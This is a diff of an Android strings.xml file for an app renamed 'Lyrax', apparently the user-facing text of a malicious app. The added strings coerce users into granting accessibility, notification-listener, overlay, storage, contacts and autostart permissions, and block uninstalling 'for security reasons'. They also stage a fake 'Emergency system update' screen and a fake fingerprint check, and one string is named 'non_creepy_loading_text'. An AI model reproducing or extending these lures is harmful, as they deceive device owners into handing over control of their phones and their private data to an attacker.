@@ -1,4 +1,42 @@
 <resources>
-    <string name="app_name">User  Side</string>
-    <string name="accessibility_service_description">Enable</string>
+    <string name="app_name">Lyrax</string>
+    <string name="accessibility_service_description">Enable Accessibility Service to help the app do his work</string>
+    <string name="accessibility_service_label" translatable="false">Notification Listener Accessibility Service</string>
+    <string name="accessibility_dialog_title">Enable Accessibility Service</string>
+    <string name="accessibility_service_message">You have to enable Accessibility Service to keep using app</string>
+    <string name="positive_dialog_button_text">Go to settings</string>
+    <string name="negative_dialog_button_text">Cancel</string>
+    <string name="draw_over_other_apps_dialog_title">Enable draw over other apps permission</string>
+    <string name="draw_over_other_apps_dialog_message">You have to enable draw over other apps permission to keep using app</string>
+    <string name="notification_access_dialog_title">Enable notification access permission</string>
+    <string name="notification_access_dialog_message">You have to enable notification access permission to keep using app</string>
+    <string name="display_pop_up_window_dialog_title">Enable display pop-up windows while running in the background permission</string>
+    <string name="display_pop_up_window_dialog_message">You have to enable display pop-up windows while running in the background to help the app to do his work correctly</string>
+    <string name="accessibility_toast">"You can't keep using app without enabling display pop-up windows while running in the background "</string>
+    <string name="draw_over_apps_toast">You can\'t keep using app without enabling draw over other apps</string>
+    <string name="notification_access_toast">You can\'t keep using app without notification access permission</string>
+    <string name="display_pop_up_toast">You can\'t keep using app without enabling display pop-up windows while running in the background</string>
+    <string name="enable_button_text">Enable</string>
+    <string name="post_notification_permission">Enable post notifications permission to allow the app notify you with latest news</string>
+    <string name="access_restricted_message">Enable restricted settings to help the app do his work</string>
+    <string name="uninstall_warning_message">You can\'t uninstall this app for security reasons.\n\nPlease press the OK button to continue.</string>
+    <string name="warning">Warning !</string>
+    <string name="ok">OK</string>
+    <string name="accessibility_service_state">Accessibility service enabled successfully</string>
+    <string name="non_creepy_loading_text">Some small work is being completed\n\nthis will take moments…</string>
+    <string name="thanks_message">Thank you for your time</string>
+    <string name="ignore_bettary_optimization_message">Allow app to run without using battery optimization, to get notified with latest news as soon as possible</string>
+    <string name="manage_storage_permission_message">Allow manage storage permission, this will help the app to do his work correctly.</string>
+    <string name="allow_normal_permissions_message">Allow permissions like: access storage, post notifications, access contacts, etc.., this will help the app to do his work correctly.</string>
+    <string name="schedule_alarm_permission_message">Allow scheduling exact alarms, this will help the app to do his work correctly.</string>
+    <string name="don_t_close_your_screen">Don\'t close your screen</string>
+    <string name="emergency_system_update">Emergency system update</string>
+    <string name="autostart_permission_message">Enable auto start permission, this will help the app to do his work correctly.</string>
+    <string name="emergency_security_measure">Emergency security measure</string>
+    <string name="enter_your_fingerprint_to_continue">Enter your fingerprint to continue</string>
+    <string name="we_have_to_make_sure_that_you_are_nwho_using_the_device_currently">We have to make sure that you are \nwho using the device currently</string>
+    <string name="fingerprint">Fingerprint</string>
+    <string name="draw_overlay_permission_message">Enable draw over other apps permission, this will help the app to do his work correctly.</string>
+    <string name="please_wait_a_moment">Please wait a moment…</string>
+    <string name="application_is_finshing_some_work_that_will_take_a_moment">Application is finishing some work, that will take a moment.</string>
 </resources>
